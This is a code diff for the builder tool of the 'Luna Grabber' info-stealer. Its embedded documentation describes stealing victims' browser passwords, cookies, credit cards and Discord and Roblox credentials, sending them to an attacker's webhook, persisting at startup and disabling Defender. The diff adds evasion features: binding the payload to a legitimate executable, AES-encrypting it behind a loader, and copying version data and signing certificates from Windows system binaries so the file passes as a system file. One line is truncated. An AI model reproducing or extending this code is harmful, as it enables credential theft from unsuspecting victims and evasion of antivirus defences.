@@ -1,7 +1,11 @@
+import base64
 import copy
 import customtkinter as ctk
 import logging
+import logging.handlers
 import os
+import pyaes
+import py_compile
 import random
 import re
 import requests
@@ -9,29 +13,33 @@ import shutil
 import string
 import subprocess
 import sys
+import this
 import threading
 import time
+import winreg
+import zipfile
+import zlib
 from PIL import Image
-from tkinter import filedialog
+from tkinter import filedialog, messagebox
 from tools import upx
-from tools.sigthief import signfile
+from tools.sigthief import signfile, outputCert
 
 
 logging.basicConfig(
     level=logging.DEBUG,
-    filename='luna.log',
+    filename='Luna.log',
     filemode='a',
     format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
 )
-
 logger = logging.getLogger(__name__)
+
 
 class App(ctk.CTk):
     def __init__(self):
         super().__init__()
 
         self.title(f"Luna Grabber Builder - Running on v{sys.version.split()[0]}")
-        self.geometry("1000x550")
+        self.geometry("1000x605")
         self.resizable(False, False)
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
@@ -43,6 +51,7 @@ class App(ctk.CTk):
             "pingtype": None,
             "fakeerror": False,
             "startup": False,
+            "bound_startup": False,
             "defender": False,
             "systeminfo": False,
             "common_files": False,
@@ -57,7 +66,8 @@ class App(ctk.CTk):
             "self_destruct": False,
             "clipboard": False,
             "webcam": False,
-            "games": False
+            "games": False,
+            "mutex": None
         }
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
@@ -72,6 +82,7 @@ class App(ctk.CTk):
         self.iconpath = None
         self.iconbitmap(f"{image_path}luna.ico")
         self.boundExePath = ""
+        self.boundExeRunOnStartup = False
 
         self.navigation_frame = ctk.CTkFrame(self, corner_radius=0)
         self.navigation_frame.grid(row=0, column=0, sticky="nsew")
@@ -229,11 +240,16 @@ class App(ctk.CTk):
 
         self.filename = ctk.CTkEntry(self.builder_frame, width=250, font=ctk.CTkFont(size=33, family=self.font),
                                                placeholder_text="File Name")
-        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=420)
+        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=475)
+        
+        self.bindExeButtonControl = ctk.CTkButton(self.builder_frame, width=575, text="Bind Executable", fg_color="#5d11c3", hover_color="#5057eb",
+                                               font=ctk.CTkFont(size=33, family=self.font), command=self.bindExeButtonControl_Callback)
+        self.bindExeButtonControl.grid(row=1, column=0, sticky="nw", padx=85, pady=420)
+        self.bindExeButtonControl.configure(state="enabled")
 
         self.build = ctk.CTkButton(self.builder_frame, width=250, text="Build", font=ctk.CTkFont(size=35, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
-        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
+        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=475)
         
         self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.common_files, self.browser, self.webcam,
                            self.roblox, self.obfuscation, self.injection, self.wifi, self.games, self.antidebug_vm, self.discord, self.clipboard,
@@ -252,14 +268,14 @@ class App(ctk.CTk):
         self.docsbox.insert(
             "0.0",
             """
-Add To Startup:\n
-This will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\n
+Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\n
+Disable Defender:\nThis will try to disable Defender and add exclutions for .py, .exe, appdata and localappdata.
 Fake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\n
 Ping:\nThis will ping you at the moment when information is being sent to your webhook.\n\n
 Ping Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\n
 System Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n
 Common Files:\nSearches Desktop, Documents, Downloads folder for files containing sensitive information (like "secret", "password", etc.) or specific file extensions (.txt, .pdf, etc.), excluding shortcuts.\n\n
-Browser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\n
+Browser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards. (Will ForceClose Browsers)\n\n
 Roblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\n
 Obfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\n
 Injection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\n
@@ -366,12 +382,36 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             self.icon.configure(state="normal")
             self.startup.configure(state="normal")
             self.pump.configure(state="normal")
+            self.bindExeButtonControl.configure(state="normal")
         elif self.fileopts.get() == ".py":
             self.icon.configure(state="disabled")
             self.startup.configure(state="disabled")
             self.startup.deselect()
             self.pump.configure(state="disabled")
             self.pump.deselect()
+            self.bindExeButtonControl.configure(state="disabled")
+            self.bindExeButtonControl.configure(text="Bind Executable")
+            self.boundExePath = ""
+            
+    def bindExeButtonControl_Callback(self):
+        UNBIND = "Unbind Executable"
+        BIND = "Bind Executable"
+
+        buttonText = self.bindExeButtonControl.cget("text")
+
+        if buttonText == BIND:
+            allowedFiletypes = (("Executable file", "*.exe"),)
+            filePath = ctk.filedialog.askopenfilename(title="Select file to bind", initialdir=".", filetypes=allowedFiletypes)
+            if os.path.isfile(filePath):
+                self.boundExePath = filePath
+                self.bindExeButtonControl.configure(text=UNBIND)
+                if messagebox.askyesno("Bind Executable", "Do you want this bound executable to run on startup as well? (Only works if `Add To Startup` option is enabled)"):
+                    self.boundExeRunOnStartup = True
+        
+        elif buttonText == UNBIND:
+            self.boundExePath = ""
+            self.boundExeRunOnStartup = False
+            self.bindExeButtonControl.configure(text=BIND)
 
     def get_icon(self):
         REMOVE = "Remove Icon"
@@ -380,7 +420,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
         buttonText = self.icon.cget("text")
         
         if buttonText == ADD:
-            user_pictures_dir = os.path.join(os.path.expanduser("~"), "Pictures")
+            user_pictures_dir = winreg.QueryValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"), "My Pictures")[0]
             allowedFiletypes = [("Image Files", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"])]
             filePath = filedialog.askopenfilename(initialdir=user_pictures_dir, title="Select Icon", filetypes=allowedFiletypes)
             if os.path.isfile(filePath):
@@ -395,6 +435,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     self.icon.configure(text=REMOVE)            
 
         elif buttonText == REMOVE:
+            os.remove("build_icon.ico")
             self.iconpath = None
             self.icon.configure(text=ADD)
 
@@ -420,10 +461,12 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             "clipboard": self.clipboard,
             "webcam": self.webcam,
             "wallets": self.wallets,
-            "games": self.games
+            "games": self.games,
         }
 
         for key, checkbox in checkbox_mapping.items():
+            self.updated_dictionary["mutex"] = "".join(random.choices(string.ascii_letters + string.digits, k=16))
+            self.updated_dictionary["bound_startup"] = self.boundExeRunOnStartup
             try:
                 if checkbox.get():
                     if key == "webhook":
@@ -458,7 +501,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
     def building_button_thread(self, thread):
         while thread.is_alive():
             for i in [".", "..", "..."]:
-                self.build.configure(width=250, text=f"Building{i}", font=ctk.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
+                self.build.configure(text=f"Building{i}")
                 time.sleep(0.3)
                 self.update()
 
@@ -511,7 +554,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                         code += "\n\n"
                 
                 if self.updated_dictionary["defender"]:
-                    with open(options+"Disable_defender.py", "r", encoding="utf-8") as f:
+                    with open(options+"Defender.py", "r", encoding="utf-8") as f:
                         code += f.read()
                         code += "\n\n"
                 
@@ -565,9 +608,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                         code += f.read()
                         code += "\n\n"
 
-                code += """if __name__ == '__main__' and os.name == "nt":
-    Luna(__CONFIG__["webhook"])
-                """
+                code += """Luna(__CONFIG__["webhook"])"""
 
                 # Remove duplicate imports
                 lines = code.split('\n')
@@ -618,32 +659,58 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "antidebug_vm": ["psutil"],
                 "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
                 "injection": ["psutil"],
-                "systeminfo": ["psutil"]
+                "webcam": ["cv2"],
+                "systeminfo": ["psutil", "pycountry"]
             }
             
             included_modules_pyinstaller = [
                 "json",
                 "requests_toolbelt",
+                "concurrent.futures",
+                "subprocess",
                 "sys",
-                "ctypes"
+                "ctypes",
+                "base64"
                 ]
             
             option_module_mapping_pyinstaller = {
                 "anti_spam": ["time"],
                 "common_files": ["shutil"],
-                "browser": ["sqlite3", "win32crypt", "Cryptodome.Cipher.AES", "base64", "psutil", "typing"],
+                "browser": ["sqlite3", "win32crypt", "Cryptodome.Cipher.AES", "psutil", "typing"],
                 "clipboard": ["pyperclip"],
-                "antidebug_vm": ["psutil", "subprocess"],
-                "defender": ["subprocess", "base64"],
-                "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt", "base64", "re"],
-                "injection": ["subprocess", "psutil", "re"],
-                "systeminfo": ["psutil", "subprocess", "pycountry"],
-                "self_destruct": ["subprocess"],
-                "wifi": ["subprocess"],
+                "antidebug_vm": ["psutil"],
+                "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt", "re"],
+                "injection": ["psutil", "re"],
+                "systeminfo": ["psutil", "pycountry"],
                 "webcam": ["cv2"],
-                "startup": ["shutil", "subprocess"],
-                "games": ["subprocess"]
+                "startup": ["shutil"],
             }
+
+            self.PrepareBound()
+            self.MakeVersionFileAndCert()
+            
+            compiledFile = "./luna-o.pyc"
+            zipFile = "serp.aes"
+            py_compile.compile(f"./{filename}.py", compiledFile)
+            os.remove(f"./{filename}.py")
+            with zipfile.ZipFile(zipFile, "w") as f:
+                f.write(compiledFile)
+            os.remove(compiledFile)
+            
+            key = os.urandom(32)
+            iv = os.urandom(12)
+            
+            encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zipFile, "rb").read())
+            encrypted = zlib.compress(encrypted)[::-1]
+            open(zipFile, "wb").write(encrypted)
+            
+            with open("loader.py", "r") as f:
+                loader = f.read()
+            loader = loader.replace("%key%", base64.b64encode(key).decode())
+            loader = loader.replace("%iv%", base64.b64encode(iv).decode()) 
+            with open("loader-o.py", "w") as f:
+                f.write(loader)
+            self.write_and_obfuscate("loader-o")
 
             if filetype == "pyinstaller":
                 upx.UPX()
@@ -659,16 +726,21 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     sys.executable, "-m", "PyInstaller",
                     "--onefile", "--clean", "--noconsole",
                     "--upx-dir=./tools", "--distpath=./",
-                    "--icon", exeicon, f"./{filename}.py"
+                    "--version-file", "./version.txt",
+                    "--add-data", "serp.aes;.", "--name", f'{filename}.exe',
+                    "--icon", exeicon, "./loader-o.py"
                 ]
             
                 for module in included_modules:
                     command.insert(-1, "--hidden-import")
                     command.insert(-1, module)
+                    
+                if os.path.isfile("bound.serp"):
+                    command.insert(-1, "--add-data")
+                    command.insert(-1, "bound.serp;.")     
 
                 subprocess.run(command)
                 
-                os.remove(f"./{filename}.py")
                 self.PostProcessing(f"./{filename}.exe")
 
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
@@ -680,26 +752,40 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     logging.error("Nuitka does not support Python 3.12")
                     return
                 else:
+                    orig_filename = self.ExtractNuitkaOptions(origFilenameOnly=True)
                     command = [
                         sys.executable, "-m", "nuitka",
                         "--onefile", "--standalone", "--remove-output",
-                        "--show-progress", "--prefer-source-code",
-                        "--assume-yes-for-downloads", "--windows-disable-console",
-                        f"./{filename}.py"
+                        "--prefer-source-code", "--include-data-file=serp.aes=.",
+                        "--show-progress", "--assume-yes-for-downloads",
+                        "--windows-disable-console",
+                        f"./{orig_filename}.py"
                     ]          
                     try:
                         for option, enabled in self.updated_dictionary.items():
                             if enabled and option in option_module_mapping_nuitka:
                                 included_modules_nuitka.extend(option_module_mapping_nuitka[option])			
                         for module in included_modules_nuitka:
-                            command.insert(-1, f"--include-module={module}")	
+                            command.insert(-1, f"--include-module={module}")
+                            
+                        nuitka_options = self.ExtractNuitkaOptions()
+                        for option, value in nuitka_options.items():
+                            command.insert(-1, f"{option}={value}")
+                            
+                        if os.path.isfile("bound.serp"):
+                            command.insert(-1, f"--include-data-file=bound.serp=.")
                             
                         if exeicon != "NONE":
                             command.insert(-1, f"--windows-icon-from-ico={exeicon}")
-                            
+                         
+                        os.rename("loader-o.py", f"{orig_filename}.py")
+                        self.ob
                         subprocess.run(command)
+                        os.remove(f"{orig_filename}.py")
+                        if os.path.isfile(f"{filename}.exe"):
+                            os.remove(f"{filename}.exe")
+                        os.rename(f"{orig_filename}.exe", f"{filename}.exe")
                         
-                        os.remove(f"./{filename}.py")
                         self.PostProcessing(f"./{filename}.exe")
                         
                         logging.info(f"Successfully compiled {filename}.exe with nuitka")
@@ -714,7 +800,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 
     def cleanup_files(self, filename):
         cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.spec', "./tools/upx.exe", "build_icon.ico"}
+        cleans_file = {f'./{filename}.spec', f'./{filename}.exe.spec', "./tools/upx.exe", "bound.serp", "serp.aes", "loader-o.py", "loader-o.spec"}
 
         for clean in cleans_dir:
             try:
@@ -736,26 +822,26 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 continue
 
     def write_and_obfuscate(self, filename):
-        def generate_name():
+        def _generate_name():
             return '_%s' % ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 20)))
         
         def _junk(path: str) -> None:
             with open(path) as file:
                 code = file.read()
-            junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
+            junk_funcs = [_generate_name() for _ in range(random.randint(25, 40))]
             junk_func_calls = junk_funcs.copy()
             
             junk_code = """
 class %s:
     def __init__(self):
-            """.strip() % generate_name()
+            """.strip() % _generate_name()
         
-            junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])
+            junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %_generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])
         
             random.shuffle(junk_funcs)
             random.shuffle(junk_func_calls)
         
-            junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])
+            junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([_generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])
         
             with open(path, "w") as file:
                 file.write(code + "\n" + junk_code)
@@ -790,44 +876,37 @@ class %s:
             self.builder_frame.after(3500, self.reset_check_webhook_button)
             return
         
+        self.switchStateOfAll("disabled")
         filename = self.return_filename()
         self.update_config()
         self.write_and_obfuscate(filename)        
         
         try:
-            if self.get_filetype() == "py":
-                self.switchStateOfAll("disabled")
-                
+            if self.get_filetype() == "py":                
                 if self.pump.get() == 1:
                     self.file_pumper(filename, "py", self.get_mb())
 
-
-            elif self.get_filetype() == "pyinstaller (.exe)":
-                self.switchStateOfAll("disabled")
-                
+            elif self.get_filetype() == "pyinstaller (.exe)":               
                 thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
                 thread.start()
                 self.building_button_thread(thread)
-
                 if self.pump.get() == 1:
                     self.file_pumper(filename, "exe", self.get_mb())
 
-            elif self.get_filetype() == "nuitka (.exe)": 
-                self.switchStateOfAll("disabled")
-                
+            elif self.get_filetype() == "nuitka (.exe)":
                 thread = threading.Thread(target=self.compile_file, args=(filename, "nuitka",))
                 thread.start()
                 self.building_button_thread(thread)
-
                 if self.pump.get() == 1:
                     self.file_pumper(filename, "exe", self.get_mb())
-          
+
+        except Exception as e:
+            logging.error(f"Error with building file: {e}")
+        finally:
             self.cleanup_files(filename)
             self.switchStateOfAll("normal")
             self.build.configure(text="Build")
 
-        except Exception as e:
-            logging.error(f"Error with building file: {e}")
             
     def PostProcessing(self, filename: str) -> None:
         logging.info("Removing MetaData")
@@ -877,6 +956,103 @@ class %s:
         self.build.configure(state=state)
         self.checkwebhook_button.configure(state=state)
         self.webhook_button.configure(state=state)
+        self.bindExeButtonControl.configure(state=state)
+        
+    def MakeVersionFileAndCert(self) -> None:
+        original: str
+        retries = 0
+        exeFiles = []
+        paths = [
+            os.getenv("SystemRoot"),
+            os.path.join(os.getenv("SystemRoot"), "System32"),
+            os.path.join(os.getenv("SystemRoot"), "sysWOW64")
+        ]
+    
+        with open("version.txt") as exefile:
+            original = exefile.read()
+    
+        for path in paths:
+            if os.path.isdir(path):
+                exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]
+    
+        if exeFiles:
+            while(retries < 5):
+                exefile = random.choice(exeFiles)
+                res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
+                if res.returncode != 0:
+                    retries += 1
+                else:
+                    with open("version.txt") as file:
+                        content = file.read()
+                    if any([(x.count("'") % 2 == 1 and not x.strip().startswith("#")) for x in content.splitlines()]):
+                        retries += 1
+                        continue
+                    else:
+                        outputCert(exefile, "cert")
+                        break
+    
+            if retries >= 5:
+                with open("version.txt", "w") as exefile:
+                    exefile.write(original)
+                    
+    def PrepareBound(self):
+        if os.path.isfile(self.boundExePath):
+            with open(self.boundExePath, "rb") as f:
+                content = f.read()
+                
+            encrypted = zlib.compress(content)[::-1]
+            
+            with open("bound.serp", "wb") as f:
+                f.write(encrypted)
+                
+        elif os.path.isfile("bound.serp"):
+            os.remove("bound.serp")
+            
+    def ExtractNuitkaOptions(self, origFilenameOnly: bool=False):
+        with open('version.txt', 'r', encoding='utf-8') as file:
+            content = file.read()
+
+        # Extracting the version info
+        file_version = re.search(r'filevers=\((\d+), (\d+), (\d+), (\d+)\)', content)
+        product_version = re.search(r'prodvers=\((\d+), (\d+), (\d+), (\d+)\)', content)
+
+        if (not file_version or not product_version) and not origFilenameOnly:
+            raise ValueError("Version information not found in the file.")
+
+        file_version_str = ".".join(file_version.groups())
+        product_version_str = ".".join(product_version.groups())
+
+        # Extracting other required fields
+        company_name = re.search(r"StringStruct\('CompanyName', '([^']*)'\)", content)
+        product_name = re.search(r"StringStruct\('ProductName', '([^']*)'\)", content)
+        file_description = re.search(r"StringStruct\('FileDescription', '([^']*)'\)", content)
+        copyright_info = re.search(r"StringStruct\('LegalCopyright', '([^']*)'\)", content)
+        original_filename = re.search(r"StringStruct\('OriginalFilename', '([^']*)'\)", content)
+        
+        if origFilenameOnly:
+            if not original_filename:
+                return "RuntimeBroker"
+            return original_filename.group(1).removesuffix('.exe')
+
+        if not company_name or not product_name or not file_description or not copyright_info:
+            raise ValueError("Required information not found in the file.")
+
+        company_name = company_name.group(1)
+        product_name = product_name.group(1)
+        file_description = file_description.group(1)
+        copyright_info = copyright_info.group(1)
+
+        # Preparing Nuitka options as strings
+        nuitka_options = {
+            '--company-name': company_name,
+            '--product-name': product_name,
+            '--file-version': file_version_str,
+            '--product-version': product_version_str,
+            '--file-description': file_description,
+            '--copyright': copyright_info
+        }
+
+        return nuitka_options
 
 
 if __name__ == "__main__":
